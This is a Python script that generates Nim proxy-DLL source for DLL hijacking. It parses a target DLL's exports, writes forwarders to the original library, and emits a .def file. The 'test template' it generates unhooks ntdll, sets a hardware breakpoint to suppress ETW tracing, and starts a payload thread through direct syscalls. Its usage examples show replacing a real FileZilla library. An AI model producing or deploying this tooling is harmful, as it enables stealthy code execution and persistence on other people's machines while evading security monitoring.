import os
import sys
import pathlib
import pefile
import argparse

def get_exports(dll_path):
    try:
        dll = pefile.PE(dll_path)
        if not hasattr(dll, 'DIRECTORY_ENTRY_EXPORT'):
            print(f"[X] No export directory found in {dll_path}")
            return []
        
        functions = []
        for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                func_name = export.name.decode()
                functions.append(func_name)
        
        return functions
    
    except Exception as e:
        print(f"[X] Error reading DLL: {e}")
        return []

def generate_test_template(dll_path, real_path=None):
    dll_abs_path = os.path.abspath(dll_path)
    if real_path:
        dll_load_path = real_path.replace('\\', '\\\\')
    else:
        dll_load_path = dll_abs_path.replace('\\', '\\\\')
    dll_name = os.path.splitext(os.path.basename(dll_path))[0]
    
    functions = get_exports(dll_path)
    if not functions:
        print(f"[X] No exported functions found in {dll_path}")
        return None
    
    unique_functions = sorted(set(functions))
    
    nim_code = f"""# Auto-generated wrapper for {dll_name}.dll
import winim/lean
import nimvoke/syscalls
import core/[etw_hwbp, unhk_module, static_strs]
import std/[logging, times]

proc NimMain() {{.cdecl, importc.}}

let testLog = newFileLogger("{dll_name}_hijacked.log")
addHandler(testLog)

proc main(param: LPVOID): DWORD {{.stdcall.}} =
  MessageBoxA(0, "Test", "Test", 0)
  return 0

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {{.stdcall, exportc, dynlib.}} =
  return true

type
  functionType = proc (arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {{.stdcall.}}

"""
    
    # Generate a proxy for each export & skip DllMain
    # Reference: gist.github.com/S3cur3Th1sSh1t/c233c1efbfb45166c2edbd74ddbf0290
    for func_name in unique_functions:
        if func_name.lower() in ['dllmain', '_dllmain@12', 'dllmain_crt_process_attach', 'dllmain_crt_process_detach']:
            continue
        
        nim_code += f"""
proc `{func_name}`(arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {{.stdcall, exportc, dynlib.}} =
  NimMain()
  var
    res: uint64 = 0
    status: NTSTATUS
    hThread: HANDLE 
    hProc: HANDLE = 0xFFFFFFFFFFFFFFFF
    
  info("[*] <{func_name}> called with args: [0x" & $arg1.toHex & ", 0x" & arg2.toHex & ", 0x" & $arg3.toHex & ", 0x" & arg4.toHex & ", 0x" & arg5.toHex & ", 0x" & arg6.toHex & ", 0x" & arg7.toHex & ", 0x" & arg8.toHex & ", 0x" & arg9.toHex & ", 0x" & arg10.toHex & ", 0x" & arg11.toHex & "]")
  if not uhkModule(jam("ntdll.dll")):
    info("[X] Failed uhkModule for NTDLL")
  if not setHWBPonNTTE():
    info("[X] Failed setting BP on NtTraceEvent")
  let startAddr = cast[PVOID](main)
  status = syscall(ZwCreateThreadEx, &hThread, GENERIC_EXECUTE, NULL, hProc, startAddr, NULL, FALSE, NULL, NULL, NULL, NULL)
  status = syscall(ZwWaitForSingleObject, hThread, FALSE, 0)
  var origDll = LoadLibraryA("{dll_load_path}")
  var origFunction = GetProcAddress(origDll, "{func_name}")
  var fnPtr = cast[functionType](origFunction)
  res = fnPtr(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12)
  info("[*] <{func_name}> returned: 0x" & $res.toHex)
  return res
"""
    return nim_code

def generate_base_template(dll_path):
    dll_name = os.path.splitext(os.path.basename(dll_path))[0]
    functions = get_exports(dll_path)
    if not functions:
        print(f"[X] No exported functions found in {dll_path}")
        return None
    
    unique_functions = sorted(set(functions))
    
    nim_code = f"""# Auto-generated wrapper for {dll_name}.dll

proc NimMain() {{.cdecl, importc.}}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {{.stdcall, exportc, dynlib.}} =
  return true
  
"""
    for func_name in unique_functions:
        if func_name.lower() in ['dllmain', '_dllmain@12', 'dllmain_crt_process_attach', 'dllmain_crt_process_detach']:
            continue
        
        nim_code += f"""
proc `{func_name}`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {{.stdcall, exportc, dynlib.}} =
  NimMain()
  return true
"""
    return nim_code

def generate_def_file(dll_path):
    functions = get_exports(dll_path)
    if not functions:
        return None
    
    dll_name = os.path.splitext(os.path.basename(dll_path))[0]
    unique_functions = sorted(set(functions))
    
    def_content = """
EXPORTS
"""
    try:
        dll = pefile.PE(dll_path)
        if hasattr(dll, 'DIRECTORY_ENTRY_EXPORT'):
            ordinal_map = {}
            for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                if export.name:
                    func_name = export.name.decode()
                    ordinal_map[func_name] = export.ordinal
            
            for func_name in unique_functions:
                if func_name.lower() in ['dllmain', '_dllmain@12', 'dllmain_crt_process_attach', 'dllmain_crt_process_detach']:
                    continue
                
                ordinal = ordinal_map.get(func_name, 0)
                def_content += f"    {func_name} @{ordinal}\n"
            
            # Add NimMain as private export
            last_ordinal = max(ordinal_map.values()) if ordinal_map else 0
            def_content += f"    NimMain @{last_ordinal + 1} NONAME PRIVATE\n"
        else:
          return ""
    except:
      return ""
    
    return def_content

def main():
    helptxt = f"""
      Examples:
        [path on the target is the same as the path used to generate the tempalte and .def]
            python gen_template.py -f C:\\Windows\\System32\\version.dll -t -d -o version_template.nim

        [path on the target where the real sqlite lib will found (set with '-r'). The real one in Program Files will be overwritten]
            python gen_template.py -f 'C:\\Program Files\\Filezilla FTP Client\\libsqlite3-0.dll' -t -r 'C:\\ProgramData\\libsqlite3-0.dll' -o sqlite_template.nim
    """    
    parser = argparse.ArgumentParser(prog='gen_template', formatter_class=argparse.RawTextHelpFormatter, epilog=helptxt)
    parser.add_argument("-f", "--dll-path", action="store", type=str, help="path to the original dll to hijack", required=True)
    parser.add_argument("-t", "--test-template", action="store_true", help="generate a full template for testing")
    parser.add_argument("-b", "--base-template", action="store_true", help="generate a basic template")
    parser.add_argument("-d", "--def-file", action="store_true", help="generate a .def file for the linker")
    parser.add_argument("-r", "--real-path", action="store", type=str, help="the path on the target disk of the original dll")
    parser.add_argument("-o", "--output-file", action="store", type=str, help="output Nim file name")
    args = parser.parse_args()
    
    if not os.path.exists(args.dll_path):
        print(f"[X] File '{args.dll_path}' not found")
        sys.exit(1)
    
    dll_name = os.path.splitext(os.path.basename(args.dll_path))[0]
    
    if args.test_template:
        if args.real_path:
            nim_code = generate_test_template(args.dll_path, args.real_path)
        else:
            nim_code = generate_test_template(args.dll_path)
        if args.output_file:
            with open(f"{args.output_file}", 'w') as f:
                f.write(nim_code)
            print(f"[+] Generated Nim template: {args.output_file}")
        else:
            with open(f"{dll_name}_template.nim", 'w') as f:
                f.write(nim_code)
            print(f"[+] Generated Nim template: {dll_name}_template.nim")
    
    if args.base_template:
        nim_code = generate_base_template(args.dll_path)
        if args.output_file:
            with open(f"{args.output_file}", 'w') as f:
                f.write(nim_code)
            print(f"[+] Generated Nim template: {args.output_file}")
        else:
            with open(f"{dll_name}_template.nim", 'w') as f:
                f.write(nim_code)
            print(f"[+] Generated Nim template: {dll_name}_basic_template.nim")

    if args.def_file:
        def_content = generate_def_file(args.dll_path)
        if def_content:
            with open(f"{dll_name}.def", 'w') as f:
                f.write(def_content)
            print(f"[+] Generated .def file: {dll_name}.def")

if __name__ == "__main__":
    main()